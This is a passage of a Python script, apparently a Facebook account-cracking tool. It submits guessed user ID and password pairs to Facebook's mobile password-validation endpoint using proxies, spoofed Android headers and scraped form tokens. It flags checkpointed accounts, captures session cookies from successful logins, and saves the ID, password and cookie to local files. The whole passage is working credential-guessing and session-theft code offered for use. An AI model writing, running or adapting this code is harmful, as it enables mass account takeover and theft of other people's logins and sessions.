                'https://m.facebook.com/login.php?skip_api_login=1&api_key=222161937813280&kid_directed_site=0&app_id=222161937813280&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D222161937813280%26redirect_uri%3Dhttps%253A%252F%252Faccount.xiaomi.com%252Fpass%252Fsns%252Flogin%252Fload%26state%3DSTATE_248222%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D11699442-ce8e-4d69-8952-fb5f6b0c3d12%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DSTATE_248222%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr')
            dataa = {"lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
                     "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1), "uid": idf,
                     "next": "https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
                     "flow": "login_no_pin", "pass": pw, }
            koki = (";").join(["%s=%s" % (key, value) for key, value in p.cookies.get_dict().items()])
            koki += ' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'cache-control': 'max-age=0',
                     'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"', 'sec-ch-ua-mobile': '?1',
                     'sec-ch-ua-platform': '"Android"', 'upgrade-insecure-requests': '1',
                     'origin': 'https://m.facebook.com', 'content-type': 'application/x-www-form-urlencoded',
                     'user-agent': ua,
                     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                     'x-requested-with': 'XMLHttpRequest', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors',
                     'sec-fetch-dest': 'empty',
                     'referer': 'https://m.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
                     'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',
                          data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False, proxies=proxs)
            if "checkpoint" in po.cookies.get_dict().keys():
                tree = Tree('')
                tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
                os.system('play-audio CP.mp3')
                tree.add(f'{puti}{ua}{x}')
                prints(tree)
                open('OK/' + okc, 'a').write(idf + '|' + pw + '\n')
                akun.append(idf + '|' + pw)
                cp += 1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                coki = po.cookies.get_dict()
                kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                kukis = kuki.replace(f'c_user={idf};datr', 'sb')
                os.system("play-audio OK.mp3")
                print('')
                tree = Tree("")
                tree.add(f'{hijo}{idf}{x}').add(f'{hijo}{pw}{x}')
                tree.add(f'{hijo}{kuki}{x}').add(f'{mer}{ua}{x}')
                print('')
                prints(tree)
                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                cek_apk(kuki)
                break

            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1


# ---------------------------NEW METHOD------------------------#

# ----------[ SYSTEM-CONTROL ]----------#
if __name__ == '__main__':
    try:
        os.mkdir('OK')
    except:
        pass
    try:
        os.mkdir('CP')
    except:
        pass
    login()
